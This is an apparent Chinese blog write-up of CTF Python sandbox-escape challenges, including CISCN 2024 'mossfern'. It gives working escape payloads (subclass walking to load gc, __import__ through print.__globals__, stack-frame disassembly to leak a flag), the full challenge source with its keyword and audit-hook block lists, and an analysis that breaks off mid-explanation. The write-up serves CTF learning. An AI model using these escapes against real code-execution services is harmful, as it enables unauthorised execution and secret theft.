+<p>主要关注两个部分，如下：</p>
+<ul>
+<li><code>id()</code>函数：返回对象的内存地址，<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhuzuwei/article/details/80554776">参考文章</a></li>
+<li><code>ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</code></li>
+</ul>
+<p>将第二个拆分解答</p>
+<ul>
+<li><p><code>ctypes.cast(address, type)</code> 函数将一个地址转换为指定类型的指针。在这里是将一个地址转换为指定类型的指针。</p>
+</li>
+<li><p><code>ctypes.c_char_p</code>是ctypes类的数据，表示 C 风格的 <code>char *</code> 指针，用于指向字符串。</p>
+</li>
+<li><p><code>flag_id-8*</code>，那随便输入两个变量套一个id()就可以看看两个变量的地址差值，尝试了一下，完全符合，晨曦师傅tql</p>
+</li>
+</ul>
+<p>结合起来，<code>ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</code>，可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/jhsxy2005/article/details/114371993">文章</a></p>
+<p>这就是读取对应内存地址的值的构造方法，<strong>那么为什么是<code>flag_id-8*i</code>，个人想法</strong>（应该没有错吧）：</p>
+<p>当前<code>flag_id</code>对应<code>DISPOSED</code>，同时已知这个真实flag是先被赋值了的，说明真实flag的内存是在前面，所以这里是<code>-</code>，向前推进。</p>
+<p>然后最后匹配到就输出flag。精妙精妙，学到了学到了。</p>
+<h6 id="gc模块"><a href="#gc模块" class="headerlink" title="gc模块"></a><code>gc</code>模块</h6><p>由于过滤了<code>__import__</code>，这里要自己找一个能加载模块的类</p>
+<p>最后选择了<code>_frozen_importlib.BuiltinImporter</code>这个可以导入内置模块的查找器,<a target="_blank" rel="noopener" href="https://blog.csdn.net/jeffery0207/article/details/120612313">参考文章</a></p>
+<p><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print([].__class__.__base__.__subclasses__()[84].load_module(&#x27;gc&#x27;).get_objects())</span><br></pre></td></tr></table></figure>
+
+
+
+<p>让gpt改了一下，本地利用的方式为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _frozen_importlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入的模块名称</span></span><br><span class="line">module_name = <span class="string">&#x27;gc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用BuiltinImporter导入模块</span></span><br><span class="line">loaded_module = _frozen_importlib.BuiltinImporter.load_module(module_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模块内容</span></span><br><span class="line"><span class="built_in">print</span>(loaded_module)</span><br><span class="line"><span class="built_in">print</span>(loaded_module.get_objects())</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="官方的做法"><a href="#官方的做法" class="headerlink" title="官方的做法"></a>官方的做法</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sys = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line">io = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;io&#x27;</span>)</span><br><span class="line">dis = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;dis&#x27;</span>)</span><br><span class="line">threading = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())     <span class="comment">#获取所有活跃线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread())    <span class="comment">#获取主线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread().ident)   <span class="comment"># 获取主线程标识符</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames())      <span class="comment"># 获取所有线程的堆栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames()[threading.main_thread().ident]) <span class="comment">#获取到主线程的堆栈帧对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = sys._current_frames()[threading.main_thread().ident]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> frame <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	out = io.StringIO()     <span class="comment"># 内存创建字符串I/O流</span></span><br><span class="line">	dis.dis(frame.f_code,file=out)   <span class="comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span></span><br><span class="line">	content = out.getvalue()    <span class="comment">#获取反汇编的结果</span></span><br><span class="line">	out.close()</span><br><span class="line">	<span class="built_in">print</span>(content)</span><br><span class="line">	frame = frame.f_back</span><br></pre></td></tr></table></figure>
+
+<p>这里因为源码里对flag重复赋值了一次导致直接查app.py的<code>f_globals</code>得不到flag</p>
+<p>需要对其栈帧进行反汇编拿到初次赋值的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">out = io.StringIO()     # 内存创建字符串I/O流</span><br><span class="line">dis.dis(frame.f_code,file=out)   # 将当前堆栈帧所对应的函数的字节码进行反汇编</span><br><span class="line">content = out.getvalue()    #获取反汇编的结果</span><br><span class="line">out.close()</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
+
+<p>分析可看参考文章</p>
+<p>文章：<code>https://chenxi9981.github.io/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/</code></p>
+<p><code>https://c1oudfl0w0.github.io/blog/2024/04/24/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/#gc%E8%A7%A3%E6%B3%95</code></p>
+<h5 id="CISCN-2024-–mossfern"><a href="#CISCN-2024-–mossfern" class="headerlink" title="CISCN 2024 –mossfern"></a>CISCN 2024 –mossfern</h5><p>题目描述：<br>小明最近搭建了一个学习 Python 的网站，他上线了一个 Demo。据说提供了很火很安全的在线执行功能，你能帮他测测看吗？</p>
+<p>——————————————————</p>
+<p>在ctfshow上可以复现，但是没有前端，不想去复现，给了附件：</p>
+<p>main.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>runner.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
+
+<p>关键代码，在runner.py中，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">source_simple_check函数中：禁了<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span></span><br><span class="line">block_wrapper函数中，禁了<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span></span><br><span class="line">禁了gc模块</span><br><span class="line">source_opcode_checker函数要求opcode解释出来还不能有LOAD_GLOBAL、IMPORT_NAME、 LOAD_METHOD</span><br><span class="line"></span><br><span class="line">其他地方，这里将内建函数禁了，那么这里就用不了`<span class="built_in">next</span>()`函数</span><br><span class="line"><span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
+
+<p>先看了一下其他师傅的wp，我最开始不是很懂为什么会得到flag的值，审计代码+测试代码搞懂了，首先注意下面这一个部分代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(f&quot;/app/uploads/&#123;id&#125;.py&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(</span><br><span class="line">            runner.replace(&quot;THIS_IS_SEED&quot;, flag).replace(&quot;THIS_IS_TASK_RANDOM_ID&quot;, id))</span><br></pre></td></tr></table></figure>
+
+<p>这里应该是flag的值没有被改变，只是在写进去的时候被改变了，出题人就是在这里“不安好心”，先看测试代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;ajhduiahdu&#125;&quot;</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/1234.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">        runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dis.dis(haha))</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;flag&#123;ajhduiahdu&#125;&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>           <span class="number">4</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">open</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;/app/uploads/1234.py&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">             <span class="number">10</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">5</span> ((<span class="string">&#x27;encoding&#x27;</span>,))</span><br><span class="line">             <span class="number">14</span> CALL_FUNCTION_KW         <span class="number">3</span></span><br><span class="line">             <span class="number">16</span> LOAD_METHOD              <span class="number">1</span> (write)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">18</span> LOAD_GLOBAL              <span class="number">2</span> (runner)</span><br><span class="line">             <span class="number">20</span> LOAD_METHOD              <span class="number">3</span> (replace)</span><br><span class="line">             <span class="number">22</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;THIS_IS_SEED&#x27;</span>)</span><br><span class="line">             <span class="number">24</span> LOAD_FAST                <span class="number">0</span> (flag)</span><br><span class="line">             <span class="number">26</span> CALL_METHOD              <span class="number">2</span></span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">28</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> POP_TOP</span><br><span class="line">             <span class="number">32</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">34</span> RETURN_VALUE</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到字节码中已经有了完整的<code>THIS_IS_SEED</code>，所以在我们输出时肯定有这个被输出，但是这个被禁了，如下代码：</p>
